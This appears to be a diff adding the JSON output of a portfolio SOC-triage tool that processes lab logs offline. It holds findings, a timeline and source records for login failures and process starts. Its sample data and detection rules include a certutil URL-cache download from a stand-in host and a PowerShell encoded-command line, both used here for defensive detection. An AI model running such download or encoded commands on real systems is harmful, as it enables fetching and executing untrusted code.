@@ -1,0 +1,563 @@
+{
+  "schema": "portfolio.soc-triage.v1",
+  "status": "PARTIAL",
+  "scope": "Offline exported-log processing; review candidates, not confirmed incidents. No endpoint collection, network calls or response actions.",
+  "source_sha256": {
+    "triage.py": "f74800fa490303e2a62d061b53ca2d0ffdc6ebbbcc5b83800495a84ae1787fd7",
+    "process_triage.py": "cd8784969935356a724d55a2a5f1e7885f6338fe5b1d5d4137e0578398412064"
+  },
+  "summary": {
+    "input_rows": 20,
+    "accepted_events": 13,
+    "duplicate_rows": 1,
+    "rejected_rows": 6,
+    "review_candidates": 3
+  },
+  "inputs": [
+    {
+      "id": "S01",
+      "name": "authentication.csv",
+      "format": "csv",
+      "sha256": "0099191c7dd9ab4395676b63b93b95de9ef28d4152b08e626ee0939f44efffae",
+      "rows": 12
+    },
+    {
+      "id": "S02",
+      "name": "processes.json",
+      "format": "json",
+      "sha256": "2461f8d3fa083458e7ddc5398a4dc12a119477970f8d2fb300b4b767f610702a",
+      "rows": 8
+    }
+  ],
+  "notes": [
+    "Same-time failures and successes do not establish order: tied failures are excluded and every success resets the earlier failure history."
+  ],
+  "findings": [
+    {
+      "rule_id": "AUTH_FAILURES_THEN_SUCCESS",
+      "timestamp": "2026-10-26T10:10:00Z",
+      "username": "lab_analyst",
+      "host": "lab-wks-01",
+      "source_ip": "192.0.2.10",
+      "reason": "5 earlier failures within inclusive 600 seconds, then success on the same user/host/IP.",
+      "source_refs": [
+        "S01:R000001",
+        "S01:R000002",
+        "S01:R000003",
+        "S01:R000007",
+        "S01:R000004",
+        "S01:R000005",
+        "S01:R000006"
+      ],
+      "next_step": "Confirm account ownership, MFA context and approved activity before assigning incident severity."
+    },
+    {
+      "rule_id": "CERTUTIL_URLCACHE_FETCH",
+      "timestamp": "2026-10-26T10:12:00Z",
+      "username": "lab_analyst",
+      "host": "lab-wks-01",
+      "reason": "certutil URL cache and force flags",
+      "source_refs": [
+        "S02:R000002"
+      ],
+      "next_step": "Validate command content, parent process and authorization; encoding alone does not establish malicious intent."
+    },
+    {
+      "rule_id": "PS_ENCODED_COMMAND",
+      "timestamp": "2026-10-26T10:12:00Z",
+      "username": "lab_analyst",
+      "host": "lab-wks-01",
+      "reason": "PowerShell encoded-command argument",
+      "source_refs": [
+        "S02:R000001"
+      ],
+      "next_step": "Validate command content, parent process and authorization; encoding alone does not establish malicious intent."
+    }
+  ],
+  "timeline": [
+    {
+      "timestamp": "2026-10-26T10:00:00Z",
+      "username": "lab_analyst",
+      "host": "lab-wks-01",
+      "event_type": "login_failure",
+      "event_uid": "a01",
+      "source_ip": "192.0.2.10",
+      "source_refs": [
+        "S01:R000001"
+      ]
+    },
+    {
+      "timestamp": "2026-10-26T10:00:00Z",
+      "username": "lab_control",
+      "host": "lab-wks-02",
+      "event_type": "login_failure",
+      "event_uid": "b01",
+      "source_ip": "192.0.2.20",
+      "source_refs": [
+        "S01:R000008"
+      ]
+    },
+    {
+      "timestamp": "2026-10-26T10:01:00Z",
+      "username": "lab_analyst",
+      "host": "lab-wks-01",
+      "event_type": "login_failure",
+      "event_uid": "a02",
+      "source_ip": "192.0.2.10",
+      "source_refs": [
+        "S01:R000002"
+      ]
+    },
+    {
+      "timestamp": "2026-10-26T10:01:00Z",
+      "username": "lab_control",
+      "host": "lab-wks-02",
+      "event_type": "login_failure",
+      "event_uid": "b02",
+      "source_ip": "192.0.2.20",
+      "source_refs": [
+        "S01:R000009"
+      ]
+    },
+    {
+      "timestamp": "2026-10-26T10:02:00Z",
+      "username": "lab_analyst",
+      "host": "lab-wks-01",
+      "event_type": "login_failure",
+      "event_uid": "a03",
+      "source_ip": "192.0.2.10",
+      "source_refs": [
+        "S01:R000003",
+        "S01:R000007"
+      ]
+    },
+    {
+      "timestamp": "2026-10-26T10:02:00Z",
+      "username": "lab_control",
+      "host": "lab-wks-02",
+      "event_type": "login_success",
+      "event_uid": "b03",
+      "source_ip": "192.0.2.20",
+      "source_refs": [
+        "S01:R000010"
+      ]
+    },
+    {
+      "timestamp": "2026-10-26T10:03:00Z",
+      "username": "lab_analyst",
+      "host": "lab-wks-01",
+      "event_type": "login_failure",
+      "event_uid": "a04",
+      "source_ip": "192.0.2.10",
+      "source_refs": [
+        "S01:R000004"
+      ]
+    },
+    {
+      "timestamp": "2026-10-26T10:04:00Z",
+      "username": "lab_analyst",
+      "host": "lab-wks-01",
+      "event_type": "login_failure",
+      "event_uid": "a05",
+      "source_ip": "192.0.2.10",
+      "source_refs": [
+        "S01:R000005"
+      ]
+    },
+    {
+      "timestamp": "2026-10-26T10:10:00Z",
+      "username": "lab_analyst",
+      "host": "lab-wks-01",
+      "event_type": "login_success",
+      "event_uid": "a06",
+      "source_ip": "192.0.2.10",
+      "source_refs": [
+        "S01:R000006"
+      ]
+    },
+    {
+      "timestamp": "2026-10-26T10:12:00Z",
+      "username": "lab_analyst",
+      "host": "lab-wks-01",
+      "event_type": "process_start",
+      "event_uid": "p01",
+      "source_ip": "",
+      "image": "powershell.exe",
+      "command_line": "powershell.exe -EncodedCommand LAB_ONLY_PLACEHOLDER",
+      "parent_image": "explorer.exe",
+      "process_id": null,
+      "source_refs": [
+        "S02:R000001"
+      ]
+    },
+    {
+      "timestamp": "2026-10-26T10:12:00Z",
+      "username": "lab_analyst",
+      "host": "lab-wks-01",
+      "event_type": "process_start",
+      "event_uid": "p02",
+      "source_ip": "",
+      "image": "certutil.exe",
+      "command_line": "certutil.exe -urlcache -f https://example.invalid/lab.bin lab.bin",
+      "parent_image": "explorer.exe",
+      "process_id": null,
+      "source_refs": [
+        "S02:R000002"
+      ]
+    },
+    {
+      "timestamp": "2026-10-26T10:12:00Z",
+      "username": "lab_analyst",
+      "host": "lab-wks-01",
+      "event_type": "process_start",
+      "event_uid": "p03",
+      "source_ip": "",
+      "image": "powershell.exe",
+      "command_line": "powershell.exe -File diagnostic.ps1",
+      "parent_image": "explorer.exe",
+      "process_id": null,
+      "source_refs": [
+        "S02:R000003"
+      ]
+    },
+    {
+      "timestamp": "2026-10-26T10:12:00Z",
+      "username": "lab_analyst",
+      "host": "lab-wks-01",
+      "event_type": "process_start",
+      "event_uid": "p04",
+      "source_ip": "",
+      "image": "certutil.exe",
+      "command_line": "certutil.exe -hashfile local.bin SHA256",
+      "parent_image": "explorer.exe",
+      "process_id": null,
+      "source_refs": [
+        "S02:R000004"
+      ]
+    }
+  ],
+  "source_records": [
+    {
+      "id": "S01:R000001",
+      "input_id": "S01",
+      "data_record": 1,
+      "parsed_record_sha256": "e7060b34de74c298dcf6976cfa9c736059a1c57aff635b026433e203240a0ec1",
+      "raw": {
+        "event_uid": "a01",
+        "timestamp": "2026-10-26T10:00:00Z",
+        "username": "lab_analyst",
+        "host": "LAB-WKS-01",
+        "event_type": "login_failure",
+        "source_ip": "192.0.2.10"
+      },
+      "status": "accepted"
+    },
+    {
+      "id": "S01:R000002",
+      "input_id": "S01",
+      "data_record": 2,
+      "parsed_record_sha256": "c02815b2bf315775b4eaa24d820feaabb31494827fc4c4eadee7dcf0ba6151e4",
+      "raw": {
+        "event_uid": "a02",
+        "timestamp": "2026-10-26T10:01:00Z",
+        "username": "lab_analyst",
+        "host": "LAB-WKS-01",
+        "event_type": "login_failure",
+        "source_ip": "192.0.2.10"
+      },
+      "status": "accepted"
+    },
+    {
+      "id": "S01:R000003",
+      "input_id": "S01",
+      "data_record": 3,
+      "parsed_record_sha256": "7b8b966e6ecf6b34cd91e5b08b3e753e5ff64009c45674d0d2d190574c7a28d4",
+      "raw": {
+        "event_uid": "a03",
+        "timestamp": "2026-10-26T10:02:00Z",
+        "username": "lab_analyst",
+        "host": "LAB-WKS-01",
+        "event_type": "login_failure",
+        "source_ip": "192.0.2.10"
+      },
+      "status": "accepted"
+    },
+    {
+      "id": "S01:R000004",
+      "input_id": "S01",
+      "data_record": 4,
+      "parsed_record_sha256": "a48cbbbec6f462269862266fbe85afb854b7a1049ccf0ca12f5cea77cda4a348",
+      "raw": {
+        "event_uid": "a04",
+        "timestamp": "2026-10-26T10:03:00Z",
+        "username": "lab_analyst",
+        "host": "LAB-WKS-01",
+        "event_type": "login_failure",
+        "source_ip": "192.0.2.10"
+      },
+      "status": "accepted"
+    },
+    {
+      "id": "S01:R000005",
+      "input_id": "S01",
+      "data_record": 5,
+      "parsed_record_sha256": "c4a5288581fd7b95c75d14f9c838d546ef2bbe28125571b1646bac7c8aa93496",
+      "raw": {
+        "event_uid": "a05",
+        "timestamp": "2026-10-26T10:04:00Z",
+        "username": "lab_analyst",
+        "host": "LAB-WKS-01",
+        "event_type": "login_failure",
+        "source_ip": "192.0.2.10"
+      },
+      "status": "accepted"
+    },
+    {
+      "id": "S01:R000006",
+      "input_id": "S01",
+      "data_record": 6,
+      "parsed_record_sha256": "834b601e3f2b247e6cc88141d50a69252b6c4a550174fc0205f2f98b31dc691e",
+      "raw": {
+        "event_uid": "a06",
+        "timestamp": "2026-10-26T12:10:00+02:00",
+        "username": "lab_analyst",
+        "host": "LAB-WKS-01",
+        "event_type": "login_success",
+        "source_ip": "192.0.2.10"
+      },
+      "status": "accepted"
+    },
+    {
+      "id": "S01:R000007",
+      "input_id": "S01",
+      "data_record": 7,
+      "parsed_record_sha256": "7b8b966e6ecf6b34cd91e5b08b3e753e5ff64009c45674d0d2d190574c7a28d4",
+      "raw": {
+        "event_uid": "a03",
+        "timestamp": "2026-10-26T10:02:00Z",
+        "username": "lab_analyst",
+        "host": "LAB-WKS-01",
+        "event_type": "login_failure",
+        "source_ip": "192.0.2.10"
+      },
+      "status": "duplicate",
+      "duplicate_of": "S01:R000003"
+    },
+    {
+      "id": "S01:R000008",
+      "input_id": "S01",
+      "data_record": 8,
+      "parsed_record_sha256": "02a2cc1792cd1c291b9f9963361bd418551c84feafbffef55e80848efdd7a26a",
+      "raw": {
+        "event_uid": "b01",
+        "timestamp": "2026-10-26T10:00:00Z",
+        "username": "lab_control",
+        "host": "LAB-WKS-02",
+        "event_type": "login_failure",
+        "source_ip": "192.0.2.20"
+      },
+      "status": "accepted"
+    },
+    {
+      "id": "S01:R000009",
+      "input_id": "S01",
+      "data_record": 9,
+      "parsed_record_sha256": "b9401f469e3cfdfec33eccbaf8307d2cf90bb7b953306b34c43735fa6c620fe4",
+      "raw": {
+        "event_uid": "b02",
+        "timestamp": "2026-10-26T10:01:00Z",
+        "username": "lab_control",
+        "host": "LAB-WKS-02",
+        "event_type": "login_failure",
+        "source_ip": "192.0.2.20"
+      },
+      "status": "accepted"
+    },
+    {
+      "id": "S01:R000010",
+      "input_id": "S01",
+      "data_record": 10,
+      "parsed_record_sha256": "b1e54ef306d52face9dc44f759994ff690a172d7e6ea43db417d243120b3a3df",
+      "raw": {
+        "event_uid": "b03",
+        "timestamp": "2026-10-26T10:02:00Z",
+        "username": "lab_control",
+        "host": "LAB-WKS-02",
+        "event_type": "login_success",
+        "source_ip": "192.0.2.20"
+      },
+      "status": "accepted"
+    },
+    {
+      "id": "S01:R000011",
+      "input_id": "S01",
+      "data_record": 11,
+      "parsed_record_sha256": "5448dbfa3f744fbb5872b198bcbabee4b72545ff2851d0e8033e127edb2d8384",
+      "raw": {
+        "event_uid": "bad01",
+        "timestamp": "2026-10-26T10:00:00",
+        "username": "lab_unknown",
+        "host": "LAB-WKS-03",
+        "event_type": "login_failure",
+        "source_ip": "192.0.2.30"
+      },
+      "status": "rejected",
+      "reason": "Timestamp must include an explicit timezone"
+    },
+    {
+      "id": "S01:R000012",
+      "input_id": "S01",
+      "data_record": 12,
+      "parsed_record_sha256": "3a10158361253889bc0cb20d94bdfcc2add24e1b1ea138df365c7cdc20d85951",
+      "raw": {
+        "event_uid": "bad02",
+        "timestamp": "2026-10-26T10:00:00Z",
+        "username": "lab_unknown",
+        "host": "LAB-WKS-03",
+        "event_type": "login_failure",
+        "source_ip": "not-an-address"
+      },
+      "status": "rejected",
+      "reason": "'not-an-address' does not appear to be an IPv4 or IPv6 address"
+    },
+    {
+      "id": "S02:R000001",
+      "input_id": "S02",
+      "data_record": 1,
+      "parsed_record_sha256": "27de8176858f59646c1f6a1bc1f443cc6e7850893c68aee7e5bfbb918d8fe756",
+      "raw": {
+        "timestamp": "2026-10-26T10:12:00Z",
+        "user": "lab_analyst",
+        "computer": "LAB-WKS-01",
+        "action": "process_start",
+        "parent_image": "explorer.exe",
+        "event_uid": "p01",
+        "image": "powershell.exe",
+        "command_line": "powershell.exe -EncodedCommand LAB_ONLY_PLACEHOLDER"
+      },
+      "status": "accepted"
+    },
+    {
+      "id": "S02:R000002",
+      "input_id": "S02",
+      "data_record": 2,
+      "parsed_record_sha256": "f7b4d11a52b582c3bc566884d598f4205a9bfb957b5ce87efba6e92ebcec0857",
+      "raw": {
+        "timestamp": "2026-10-26T10:12:00Z",
+        "user": "lab_analyst",
+        "computer": "LAB-WKS-01",
+        "action": "process_start",
+        "parent_image": "explorer.exe",
+        "event_uid": "p02",
+        "image": "certutil.exe",
+        "command_line": "certutil.exe -urlcache -f https://example.invalid/lab.bin lab.bin"
+      },
+      "status": "accepted"
+    },
+    {
+      "id": "S02:R000003",
+      "input_id": "S02",
+      "data_record": 3,
+      "parsed_record_sha256": "5276a7c7236a55a2899c1b2f07f6b072b895b9f9ebe85d8d190047eed09946ac",
+      "raw": {
+        "timestamp": "2026-10-26T10:12:00Z",
+        "user": "lab_analyst",
+        "computer": "LAB-WKS-01",
+        "action": "process_start",
+        "parent_image": "explorer.exe",
+        "event_uid": "p03",
+        "image": "powershell.exe",
+        "command_line": "powershell.exe -File diagnostic.ps1"
+      },
+      "status": "accepted"
+    },
+    {
+      "id": "S02:R000004",
+      "input_id": "S02",
+      "data_record": 4,
+      "parsed_record_sha256": "7a3135baab7c874a046ba4beddcc2fde559397ec252a625323f97d7255a84168",
+      "raw": {
+        "timestamp": "2026-10-26T10:12:00Z",
+        "user": "lab_analyst",
+        "computer": "LAB-WKS-01",
+        "action": "process_start",
+        "parent_image": "explorer.exe",
+        "event_uid": "p04",
+        "image": "certutil.exe",
+        "command_line": "certutil.exe -hashfile local.bin SHA256"
+      },
+      "status": "accepted"
+    },
+    {
+      "id": "S02:R000005",
+      "input_id": "S02",
+      "data_record": 5,
+      "parsed_record_sha256": "af90b3d0e3df7f54e22013d717887528d8e5c68ac5f2001c762ca84265c4fc11",
+      "raw": {
+        "timestamp": "2026-10-26T10:12:00Z",
+        "user": "lab_analyst",
+        "computer": "LAB-WKS-01",
+        "action": "process_start",
+        "parent_image": "explorer.exe",
+        "event_uid": "bad03",
+        "image": "powershell.exe"
+      },
+      "status": "rejected",
+      "reason": "Missing required field: command_line"
+    },
+    {
+      "id": "S02:R000006",
+      "input_id": "S02",
+      "data_record": 6,
+      "parsed_record_sha256": "705491d43626456c0e5ca28ba7a3e24afeeab58e9b48a243c7e11a2b4eb7b068",
+      "raw": {
+        "timestamp": "2026-10-26T10:12:00Z",
+        "user": "lab_analyst",
+        "computer": "",
+        "action": "process_start",
+        "parent_image": "explorer.exe",
+        "event_uid": "bad04",
+        "image": "notepad.exe",
+        "command_line": "notepad.exe"
+      },
+      "status": "rejected",
+      "reason": "Missing required field: host"
+    },
+    {
+      "id": "S02:R000007",
+      "input_id": "S02",
+      "data_record": 7,
+      "parsed_record_sha256": "6e07c081f67c660f2b446072104394bbea27cd3eafe213149a3417d23e4748ce",
+      "raw": {
+        "timestamp": "2026-10-26T10:12:00Z",
+        "user": "lab_analyst",
+        "computer": "LAB-WKS-01",
+        "action": "process_start",
+        "parent_image": "explorer.exe",
+        "event_uid": "conflict01",
+        "image": "notepad.exe",
+        "command_line": "notepad.exe"
+      },
+      "status": "rejected",
+      "reason": "Conflicting or invalid copy of event_uid within host; all identifiable matching IDs quarantined"
+    },
+    {
+      "id": "S02:R000008",
+      "input_id": "S02",
+      "data_record": 8,
+      "parsed_record_sha256": "81aae7b38f6259f75af0a80a060b466509064b4a98de74741a01481b35e4b8ed",
+      "raw": {
+        "timestamp": "2026-10-26T10:12:00Z",
+        "user": "lab_analyst",
+        "computer": "LAB-WKS-01",
+        "action": "process_start",
+        "parent_image": "explorer.exe",
+        "event_uid": "conflict01",
+        "image": "notepad.exe",
+        "command_line": "notepad.exe another.txt"
+      },
+      "status": "rejected",
+      "reason": "Conflicting or invalid copy of event_uid within host; all identifiable matching IDs quarantined"
+    }
+  ]
+}
